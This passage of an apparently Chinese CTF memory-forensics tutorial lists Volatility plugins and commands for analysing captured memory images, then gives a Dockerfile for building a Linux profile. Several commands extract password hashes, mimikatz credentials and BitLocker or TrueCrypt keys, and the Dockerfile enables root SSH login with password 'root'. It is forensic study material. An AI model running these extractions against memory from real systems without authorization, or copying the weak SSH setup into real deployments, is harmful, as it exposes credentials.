class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">用法： Volatility - 内存取证分析平台</span><br><span class="line"> </span><br><span class="line">Options:</span><br><span class="line">  -h, --<span class="built_in">help</span>            列出所有可用选项及其默认值</span><br><span class="line">                        默认值可以在配置文件中设置</span><br><span class="line">                        (/etc/volatilityrc)</span><br><span class="line">  --conf-file=/home/kali/.volatilityrc</span><br><span class="line">                        基于用户的配置文件</span><br><span class="line">  -d, --debug           调试Volatility</span><br><span class="line">  --plugins=PLUGINS     要使用的其他插件目录（冒号分隔）</span><br><span class="line">  --info                打印所有注册对象的信息</span><br><span class="line">  --cache-directory=/home/kali/.cache/volatility</span><br><span class="line">                        存放缓存文件的目录</span><br><span class="line">  --cache               使用缓存</span><br><span class="line">  --tz=TZ               设置 (Olson) 时区以使用 pytz（如果已安装）或 tzset 显示时间戳</span><br><span class="line">  -f FILENAME, --filename=FILENAME</span><br><span class="line">                        打开图像时使用的文件名</span><br><span class="line">  --profile=WinXPSP2x86</span><br><span class="line">                        要加载的配置文件的名称（使用 --info 查看支持的配置文件列表）</span><br><span class="line">  -l LOCATION, --location=LOCATION</span><br><span class="line">                        从中加载地址空间的 URN 位置</span><br><span class="line">  -w, --write           启用写支持</span><br><span class="line">  --dtb=DTB             DTB 地址</span><br><span class="line">  --<span class="built_in">shift</span>=SHIFT         Mac KASLR 移位地址</span><br><span class="line">  --output=text         以这种格式输出（支持特定于模块，请参阅下面的模块输出选项）</span><br><span class="line">  --output-file=OUTPUT_FILE</span><br><span class="line">                        在此文件中写入输出</span><br><span class="line">  -v, --verbose         详细信息</span><br><span class="line">  -g KDBG, --kdbg=KDBG  指定一个 KDBG 虚拟地址（注意：对于 64 位 Windows 8 及更高版本，这是 KdCopyDataBlock 的地址）</span><br><span class="line">  --force               强制使用可疑配置文件</span><br><span class="line">  -k KPCR, --kpcr=KPCR  指定特定的 KPCR 地址</span><br><span class="line">  --cookie=COOKIE       指定 nt!ObHeaderCookie 的地址（仅适用于 Windows 10）</span><br><span class="line"> </span><br><span class="line">	支持的插件命令:</span><br><span class="line"> </span><br><span class="line">		amcache        	查看AmCache应用程序痕迹信息</span><br><span class="line">		apihooks       	检测内核及进程的内存空间中的API hook</span><br><span class="line">		atoms          	列出会话及窗口站atom表</span><br><span class="line">		atomscan       	Atom表的池扫描(Pool scanner)</span><br><span class="line">		auditpol       	列出注册表HKLMSECURITYPolicyPolAdtEv的审计策略信息</span><br><span class="line">		bigpools       	使用BigPagePoolScanner转储大分页池(big page pools)</span><br><span class="line">		bioskbd        	从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出BIOS开机密码)</span><br><span class="line">		cachedump      	获取内存中缓存的域帐号的密码哈希</span><br><span class="line">		callbacks      	打印全系统通知例程</span><br><span class="line">		clipboard      	提取Windows剪贴板中的内容</span><br><span class="line">		cmdline        	显示进程命令行参数</span><br><span class="line">		cmdscan        	提取执行的命令行历史记录（扫描_COMMAND_HISTORY信息）</span><br><span class="line">		connections    	打印系统打开的网络连接(仅支持Windows XP 和2003)</span><br><span class="line">		connscan       	打印TCP连接信息</span><br><span class="line">		consoles       	提取执行的命令行历史记录（扫描_CONSOLE_INFORMATION信息）</span><br><span class="line">		crashinfo      	提取崩溃转储信息</span><br><span class="line">		deskscan       	tagDESKTOP池扫描(Poolscaner)</span><br><span class="line">		devicetree     	显示设备树信息</span><br><span class="line">		dlldump        	从进程地址空间转储动态链接库</span><br><span class="line">		dlllist        	打印每个进程加载的动态链接库列表</span><br><span class="line">		driverirp      	IRP hook驱动检测</span><br><span class="line">		drivermodule   	关联驱动对象至内核模块</span><br><span class="line">		driverscan     	驱动对象池扫描</span><br><span class="line">		dumpcerts      	提取RAS私钥及SSL公钥</span><br><span class="line">		dumpfiles      	提取内存中映射或缓存的文件</span><br><span class="line">		dumpregistry   	转储内存中注册表信息至磁盘</span><br><span class="line">		editbox        	查看Edit编辑控件信息 (Listbox正在实验中)</span><br><span class="line">		envars         	显示进程的环境变量</span><br><span class="line">		eventhooks     	打印Windows事件hook详细信息</span><br><span class="line">		evtlogs        	提取Windows事件日志（仅支持XP/2003)</span><br><span class="line">		filescan       	提取文件对象（file objects）池信息</span><br><span class="line">		gahti          	转储用户句柄（handle）类型信息</span><br><span class="line">		gditimers      	打印已安装的GDI计时器(timers)及回调(callbacks)</span><br><span class="line">		gdt            	显示全局描述符表(Global Deor Table)</span><br><span class="line">		getservicesids 	获取注册表中的服务名称并返回SID信息</span><br><span class="line">		getsids        	打印每个进程的SID信息</span><br><span class="line">		handles        	打印每个进程打开的句柄的列表</span><br><span class="line">		hashdump       	转储内存中的Windows帐户密码哈希(LM/NTLM)</span><br><span class="line">		hibinfo        	转储休眠文件信息</span><br><span class="line">		hivedump       	打印注册表配置单元信息</span><br><span class="line">		hivelist       	打印注册表配置单元列表</span><br><span class="line">		hivescan       	注册表配置单元池扫描</span><br><span class="line">		hpakextract    	从HPAK文件（Fast Dump格式）提取物理内存数据</span><br><span class="line">		hpakinfo       	查看HPAK文件属性及相关信息</span><br><span class="line">		idt            	显示中断描述符表(Interrupt Deor Table)</span><br><span class="line">		iehistory      	重建IE缓存及访问历史记录</span><br><span class="line">		imagecopy      	将物理地址空间导出原生DD镜像文件</span><br><span class="line">		imageinfo      	查看/识别镜像信息</span><br><span class="line">		impscan        	扫描对导入函数的调用</span><br><span class="line">		joblinks       	打印进程任务链接信息</span><br><span class="line">		kdbgscan       	搜索和转储潜在KDBG值</span><br><span class="line">		kpcrscan       	搜索和转储潜在KPCR值</span><br><span class="line">		ldrmodules     	检测未链接的动态链接DLL</span><br><span class="line">		lsadump        	从注册表中提取LSA密钥信息（已解密）</span><br><span class="line">		machoinfo      	转储Mach-O 文件格式信息</span><br><span class="line">		malfind        	查找隐藏的和插入的代码</span><br><span class="line">		mbrparser      	扫描并解析潜在的主引导记录(MBR)</span><br><span class="line">		memdump        	转储进程的可寻址内存</span><br><span class="line">		memmap         	打印内存映射</span><br><span class="line">		messagehooks   	桌面和窗口消息钩子的线程列表</span><br><span class="line">		mftparser      	扫描并解析潜在的MFT条目</span><br><span class="line">		moddump        	转储内核驱动程序到可执行文件的示例</span><br><span class="line">		modscan        	内核模块池扫描</span><br><span class="line">		modules        	打印加载模块的列表</span><br><span class="line">		multiscan      	批量扫描各种对象</span><br><span class="line">		mutantscan     	对互斥对象池扫描</span><br><span class="line">		notepad        	查看记事本当前显示的文本</span><br><span class="line">		objtypescan    	扫描窗口对象类型对象</span><br><span class="line">		patcher        	基于页面扫描的补丁程序内存</span><br><span class="line">		poolpeek       	可配置的池扫描器插件</span><br><span class="line">		printkey       	打印注册表项及其子项和值</span><br><span class="line">		privs          	显示进程权限</span><br><span class="line">		procdump       	进程转储到一个可执行文件示例</span><br><span class="line">		pslist         	按照EPROCESS列表打印所有正在运行的进程</span><br><span class="line">		psscan         	进程对象池扫描</span><br><span class="line">		pstree         	以树型方式打印进程列表</span><br><span class="line">		psxview        	查找带有隐藏进程的所有进程列表</span><br><span class="line">		qemuinfo       	转储 Qemu 信息</span><br><span class="line">		raw2dmp        	将物理内存原生数据转换为windbg崩溃转储格式</span><br><span class="line">		screenshot     	基于GDI Windows的虚拟屏幕截图保存</span><br><span class="line">		servicediff    	Windows服务列表(ala Plugx)</span><br><span class="line">		sessions       	_MM_SESSION_SPACE的详细信息列表(用户登录会话)</span><br><span class="line">		shellbags      	打印Shellbags信息</span><br><span class="line">		shimcache      	解析应用程序兼容性Shim缓存注册表项</span><br><span class="line">		shutdowntime   	从内存中的注册表信息获取机器关机时间</span><br><span class="line">		sockets        	打印已打开套接字列表</span><br><span class="line">		sockscan       	TCP套接字对象池扫描</span><br><span class="line">		ssdt           	显示SSDT条目</span><br><span class="line">		strings        	物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)</span><br><span class="line">		svcscan        	Windows服务列表扫描</span><br><span class="line">		symlinkscan    	符号链接对象池扫描</span><br><span class="line">		thrdscan       	线程对象池扫描</span><br><span class="line">		threads        	调查_ETHREAD 和_KTHREADs</span><br><span class="line">		timeliner      	创建内存中的各种痕迹信息的时间线</span><br><span class="line">		timers         	打印内核计时器及关联模块的DPC</span><br><span class="line">		truecryptmaster	Recover 	恢复TrueCrypt 7.1a主密钥</span><br><span class="line">		truecryptpassphrase		查找并提取TrueCrypt密码</span><br><span class="line">		truecryptsummary	TrueCrypt摘要信息</span><br><span class="line">		unloadedmodules	打印卸载的模块信息列表</span><br><span class="line">		userassist     	打印注册表中UserAssist相关信息</span><br><span class="line">		userhandles    	转储用户句柄表</span><br><span class="line">		vaddump        	转储VAD数据为文件</span><br><span class="line">		vadinfo        	转储VAD信息</span><br><span class="line">		vadtree        	以树形方式显示VAD树信息</span><br><span class="line">		vadwalk        	显示遍历VAD树</span><br><span class="line">		vboxinfo       	转储Virtualbox信息（虚拟机）</span><br><span class="line">		verinfo        	打印PE镜像中的版本信息</span><br><span class="line">		vmwareinfo     	转储VMware VMSS/VMSN 信息</span><br><span class="line">		volshell       	内存镜像中的shell</span><br><span class="line">		windows        	打印桌面窗口(详细信息)</span><br><span class="line">		wintree        	Z顺序打印桌面窗口树</span><br><span class="line">		wndscan        	池扫描窗口站</span><br><span class="line">		yarascan       	以Yara签名扫描进程或内核内存</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 识别操作系统的基本信息</span></span><br><span class="line">vol.py mem.dump imageinfo</span><br><span class="line"><span class="comment"># 查看进程</span></span><br><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 pslist</span><br><span class="line"><span class="comment"># 查看隐藏或者解链的进程</span></span><br><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 pstree</span><br><span class="line"><span class="comment"># 通过memdump爆破出进程对应的信息</span></span><br><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 memdump -p 3036 --dump-dir=./</span><br><span class="line"><span class="comment"># 扫描镜像中的服务</span></span><br><span class="line">vol.py --plugins=/home/kali/volatility/volatility/plugins -f mem.raw --profile=Win7SP1x64 svcscan</span><br><span class="line"><span class="comment"># 扫描进程缓存的文件</span></span><br><span class="line">vol.py -f memory.raw --profile=Win7SP1x64 filescan</span><br><span class="line"><span class="comment"># 查找特定后缀的文件</span></span><br><span class="line">vol.py -f example.raw --profile=Win7SP1x64 filescan | grep -E <span class="string">&#x27;txt|png|jpg|gif|zip|rar|7z|pdf|doc&#x27;</span></span><br><span class="line"><span class="comment"># 查找指定文件夹下的文件</span></span><br><span class="line">volatility -f example.raw --profile=Win7SP1x64 filescan | grep TMP_User</span><br><span class="line"><span class="comment"># 使用dumpfiles爆破文件内容（有时可能会出现vol2提取不了但是vol3可以的情况，也可以使用 R-stdio 工具提取）</span></span><br><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007e410890 --dump-dir=./</span><br><span class="line"><span class="comment"># 查看进程环境变量</span></span><br><span class="line">vol.py -f memory.raw --profile=Win7SP1x64 envars</span><br><span class="line"><span class="comment"># 扫描进程命令行参数</span></span><br><span class="line">vol.py -f memory.raw --profile=Win7SP1x64 cmdscan</span><br><span class="line">vol.py -f memory.raw --profile=Win7SP1x64 cmdline</span><br><span class="line"><span class="comment"># 扫描动态库列表</span></span><br><span class="line"><span class="comment"># 可使用-p参数指定PID号</span></span><br><span class="line">vol.py -f memory.img --profile=Win2003SP1x86 dlllist</span><br><span class="line">vol.py -f memory.img --profile=Win2003SP1x86 ldrmodules</span><br><span class="line"><span class="comment"># 扫描系统中的恶意软件</span></span><br><span class="line">vol.py -f memory.img --profile=Win2003SP1x86 malfind</span><br><span class="line"><span class="comment"># 查看当前镜像中的用户</span></span><br><span class="line">vol.py --plugins=/home/kali/volatility/volatility/plugins -f mem.raw --profile=Win7SP1x64 printkey -K <span class="string">&quot;SAM\Domains\Account\Users\Names&quot;</span></span><br><span class="line"><span class="comment"># 查看镜像中的用户名和密码(hash值)</span></span><br><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 hashdump</span><br><span class="line"><span class="comment"># 使用mimikatz插件快速获取用户密码</span></span><br><span class="line">vol.py --plugins=/home/c3ngh/tools/volatility/volatility/plugins -f mem.dump --profile=Win7SP1x64 mimikatz</span><br><span class="line"><span class="comment"># 扫描注册表数据</span></span><br><span class="line"><span class="comment"># 查看注册表配置单元</span></span><br><span class="line">vol.py -f memory.raw --profile=Win7SP1x64 hivelist</span><br><span class="line"><span class="comment"># 查看注册表键值</span></span><br><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 printkey</span><br><span class="line"><span class="comment"># 查看注册表键名</span></span><br><span class="line">vol.py -f memory.raw --profile=Win7SP1x64 hivedump -o 0xfffff8a001cce010(注册表Volatility地址)</span><br><span class="line"><span class="comment"># 查看网络连接状态</span></span><br><span class="line">vol.py -f memory.raw --profile=Win7SP1x64 connscan</span><br><span class="line">vol.py --plugins=/home/kali/volatility/volatility/plugins -f mem.raw --profile=Win7SP1x64 netscan</span><br><span class="line">vol.py --plugins=/home/kali/volatility/volatility/plugins -f mem.raw --profile=Win7SP1x64 connections</span><br><span class="line"><span class="comment"># 查看浏览器历史记录</span></span><br><span class="line">vol.py -f 1.vmem --profile=Win7SP1x64 iehistory</span><br><span class="line"><span class="comment"># 显示有关编辑控件的信息</span></span><br><span class="line">vol.py -f 1.vmem --profile=Win7SP1x64 editbox</span><br><span class="line"><span class="comment"># 查看当前展示的notepad的内容</span></span><br><span class="line">vol.py -f 1.vmem --profile=Win7SP1x64 notepad</span><br><span class="line"><span class="comment"># 获取屏幕截图</span></span><br><span class="line">vol.py -f 1.vmem --profile=Win7SP1x64 screenshot --dump-dir=./</span><br><span class="line"><span class="comment"># 查看剪贴板信息</span></span><br><span class="line">vol.py -f 1.vmem --profile=Win7SP1x64 clipboard</span><br><span class="line"><span class="comment"># 查看剪贴板信详细内容</span></span><br><span class="line">vol.py -f 1.vmem --profile=Win7SP1x64 clipboard -v</span><br><span class="line"><span class="comment"># 查看运行程序相关的记录，比如最后一次更新时间，运行过的次数等</span></span><br><span class="line">vol.py -f 1.vmem --profile=Win7SP1x64 userassist</span><br><span class="line"><span class="comment"># 最大程序提取信息</span></span><br><span class="line">vol.py -f 1.vmem --profile=Win7SP1x64 timeliner</span><br><span class="line"><span class="comment"># 恢复被删除的文件</span></span><br><span class="line">vol.py -f 1.vmem --profile=Win7SP1x64 mftparser</span><br><span class="line"><span class="comment"># 使用ndispktscan插件搜索内核的网络流量包信息</span></span><br><span class="line">vol.py --plugins=/home/kali/volatility/volatility/plugins -f OtterCTF.vmem --profile=Win7SP1x64 ndispktscan</span><br><span class="line"><span class="comment"># 使用usbstor插件获取USB连接信息</span></span><br><span class="line">vol.py --plugins=/home/kali/volatility/volatility/plugins -f OtterCTF.vmem --profile=Win7SP1x64 usbstor</span><br><span class="line"><span class="comment"># 使用VolDiff进行恶意软件检测</span></span><br><span class="line">vol.py --plugins=/home/kali/volatility/volatility/plugins -f OtterCTF.vmem --profile=Win7SP1x64 voldiff</span><br><span class="line"><span class="comment"># 使用bitlocker插件获取Bitlocker的加密密钥</span></span><br><span class="line">vol.py --plugins=/home/kali/volatility/volatility/plugins -f OtterCTF.vmem --profile=Win7SP1x64 bitlocker</span><br></pre></td></tr></table></figure>
<h5 id="Volatility3">Volatility3</h5>
<p>识别内存的系统版本（这个有时候vol3识别不出来，但是vol2可以）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol3.py -f dacong.raw banners.Banners</span><br></pre></td></tr></table></figure>
<p>如果是windows10的内存镜像的话，vol2的某些功能可能用不了，因此需要vol3（例：2023 安洵杯 dacongのWindows）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看命令</span></span><br><span class="line">vol3.py -h</span><br><span class="line"><span class="comment"># 扫描镜像中的文件</span></span><br><span class="line">vol3.py -f dacong.raw windows.filescan</span><br><span class="line"><span class="comment"># 查看桌面上的文件</span></span><br><span class="line">vol3.py -f dacong.raw windows.filescan | grep Desktop</span><br><span class="line"><span class="comment"># 提取文件</span></span><br><span class="line">vol3.py -f mem.raw windows.dumpfiles --virtaddr=<span class="string">&quot;0x0000e0007ad17f20&quot;</span></span><br><span class="line"><span class="comment"># 扫描注册表（感觉这个功能vol2的更好）</span></span><br><span class="line">vol3.py -f dacong.raw windows.registry.printkey</span><br><span class="line">vol3.py -f dacong.raw windows.registry.hivelist</span><br><span class="line"><span class="comment"># 扫描命令行记录</span></span><br><span class="line">vol3.py -f dacong.raw windows.cmdline</span><br><span class="line"><span class="comment"># 查看网络使用状态、端口占用状态</span></span><br><span class="line">vol3.py -f dacong.raw windows.netscan</span><br><span class="line">vol3.py -f dacong.raw windows.netstat</span><br><span class="line"><span class="comment"># 查看系统中的进程</span></span><br><span class="line">vol3.py -f dacong.raw windows.pslist</span><br><span class="line">vol3.py -f dacong.raw windows.pstree</span><br></pre></td></tr></table></figure>
<p><strong>一些特殊进程</strong></p>
<p>便签：StikyNot.exe （.snt 文件路径在C:\Users\XXX\AppData\Roaming\Microsoft\Sticky Notes\）【这个文件需要用Win7的便签或者记事本打开】</p>
<p>画图：mspaint.exe（这个进程可以用 memdump 导出 dmp 文件，然后改后缀为.data拖入Gimp中调整位移和分辨率，例：2024 NKCTF）</p>
<p>联系人：wab.exe （.contact 文件）</p>
<p><strong>一些特殊文件</strong></p>
<p>evtx - Windows系统日志</p>
<p>dat - 无法导出可以加上 -u 参数：volatility -f mem.data dumpfiles -r pdf$ -i --name -D dumpfiles/ -u</p>
<h4 id="Linux内存取证">Linux内存取证</h4>
<p>取证过程中一定要记得查看镜像桌面上的文件！</p>
<h5 id="制作-Profile-Vol2-的详细过程">制作  Profile(Vol2)  的详细过程</h5>
<p><strong>Identify the profile for Linux</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings mem | grep -i <span class="string">&#x27;Linux version&#x27;</span> | <span class="built_in">uniq</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux version 5.10.0-21-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils <span class="keyword">for</span> Debian) 2.35.2) <span class="comment">#1 SMP Debian 5.10.162-1 (2023-01-21)</span></span><br></pre></td></tr></table></figure>
<p><strong>Tips: Ubuntu 22.04 目前是不支持用 Vol2 进行取证的，必须使用 Vol3</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 例题：2022 Sekai CTF | symbolic-needs 1</span></span><br><span class="line"><span class="comment"># 题目附件的内核版本：</span></span><br><span class="line">Ubuntu 22.04 Linux-version 5.15.0-43-generic</span><br></pre></td></tr></table></figure>
<p><strong>Try to find profile on <a class="link"   target="_blank" rel="noopener" href="https://github.com/volatilityfoundation/profiles/tree/master/Linux" >Github<i class="fas fa-external-link-alt"></i></a></strong></p>
<p>如果找不到需要的profile，就需要进行下面的步骤，自己手动制作profile了</p>
<p><strong>Make the profile by yourself</strong></p>
<p>一个profile的结构如下：其实一共就两个文件</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Debian5010\boot\System.map-2.6.26-2-amd64</span><br><span class="line">Debian5010\volatility\tools\linux\module.dwarf</span><br></pre></td></tr></table></figure>
<p>这里以 Linux version 5.10.0-21-amd64 这个内核为例</p>
<p>示例项目已开源在 <a class="link"   target="_blank" rel="noopener" href="https://github.com/goodlunatic/Docker-ProfileMaker-vol2" >Lunatic的Github仓库<i class="fas fa-external-link-alt"></i></a></p>
<p>参考资料：<a class="link"   target="_blank" rel="noopener" href="https://treasure-house.randark.site/blog/2023-10-26-0xGame2023-oh-my-linux/" >巨魔大佬的博客<i class="fas fa-external-link-alt"></i></a></p>
<p>首先要到 <a class="link"   target="_blank" rel="noopener" href="https://debian.sipwise.com/debian-security/pool/main/l/linux/" >官方仓库<i class="fas fa-external-link-alt"></i></a>下载以下几个文件</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">linux-headers-5.10.0-21-amd64_5.10.162-1_amd64.deb</span><br><span class="line">linux-headers-5.10.0-21-common_5.10.162-1_all.deb</span><br><span class="line">linux-image-5.10.0-21-amd64-dbg_5.10.162-1_amd64.deb</span><br><span class="line">linux-image-5.10.0-21-amd64-unsigned_5.10.162-1_amd64.deb</span><br></pre></td></tr></table></figure>
<p>然后解压 linux-image-5.10.0-21-amd64-dbg_5.10.162-1_amd64.deb 这个文件</p>
<p>将下面这个文件复制出来</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux-image-5.10.0-21-amd64-dbg_5.10.162-1_amd64\data\usr\lib\debug\boot\System.map-5.10.0-21-amd64</span><br></pre></td></tr></table></figure>
<p>然后用 Docker 构建镜像制作 dwarf 文件，用于构建的 Dockerfile 文件如下：修改自<a class="link"   target="_blank" rel="noopener" href="https://github.com/CTF-Archives/profile-builder-Debian_5.10.0-21" >巨魔的开源项目<i class="fas fa-external-link-alt"></i></a></p>
<p>Tips:使用前需要把上面那四个文件放到 Dockerfile 同一目录下，构建好后进入容器，dwarf 文件在/app目录下</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> debian:<span class="number">11.8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./service/docker-entrypoint.sh /docker-entrypoint.sh</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src/ /src/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s/deb.debian.org/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apt/sources.list \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; sed -i <span class="string">&#x27;s/security.debian.org/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apt/sources.list \</span></span><br><span class="line"><span class="language-bash">	&amp;&amp; apt update --no-install-recommends\</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt install -y openssh-server linux-kbuild-5.10 gcc-10 dwarfdump build-essential unzip linux-compiler-gcc-10-x86 \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">chmod</span> +x /docker-entrypoint.sh \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">mkdir</span> /app \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; sed -i <span class="string">&#x27;s/\#PermitRootLogin prohibit-password/PermitRootLogin yes/g&#x27;</span> /etc/ssh/sshd_config \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; sed -i <span class="string">&#x27;s/\#PasswordAuthentication yes/PasswordAuthentication yes/g&#x27;</span> /etc/ssh/sshd_config \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;root:root&#x27;</span> | chpasswd \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; systemctl <span class="built_in">enable</span> ssh \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; service ssh start</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /src</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> linux-headers-5.10.0-21-amd64_5.10.162-1_amd64.deb linux-headers-5.10.0-21-amd64_5.10.162-1_amd64.deb</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> linux-headers-5.10.0-21-common_5.10.162-1_all.deb linux-headers-5.10.0-21-common_5.10.162-1_all.deb</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> linux-image-5.10.0-21-amd64-dbg_5.10.162-1_amd64.deb linux-image-5.10.0-21-amd64-dbg_5.10.162-1_amd64.deb</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> linux-image-5.10.0-21-amd64-unsigned_5.10.162-1_amd64.deb linux-image-5.10.0-21-amd64-unsigned_5.10.162-1_amd64.deb</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> unzip tool.zip \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; dpkg -i linux-headers-5.10.0-21-common_5.10.162-1_all.deb \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; dpkg -i linux-image-5.10.0-21-amd64-dbg_5.10.162-1_amd64.deb \</span></span><br><span class="line"><span class="language-bash">	&amp;&amp; dpkg -i linux-headers-5.10.0-21-amd64_5.10.162-1_amd64.deb</span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt --fix-broken install \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt install -y kmod linux-base initramfs-tools \</span></span><br><span class="line"><span class="language-bash">	&amp;&amp; dpkg -i linux-image-5.10.0-21-amd64-unsigned_5.10.162-1_amd64.deb \</span></span><br><span class="line"><span class="language-bash">	&amp;&amp; apt --fix-broken install -y \</span></span><br><span class="line"><span class="language-bash">	&amp;&amp; dpkg -i linux-image-5.10.0-21-amd64-unsigned_5.10.162-1_amd64.deb</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /src/linux</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;MODULE_LICENSE(&quot;GPL&quot;);&#x27;</span> &gt;&gt; module.c &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    sed -i <span class="string">&#x27;s/$(shell uname -r)/5.10.0-21-amd64/g&#x27;</span> Makefile &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    make &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mv</span> module.dwarf /app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/bin/bash&quot;</span>]</span></span><br></pre></td></tr></table></figure>
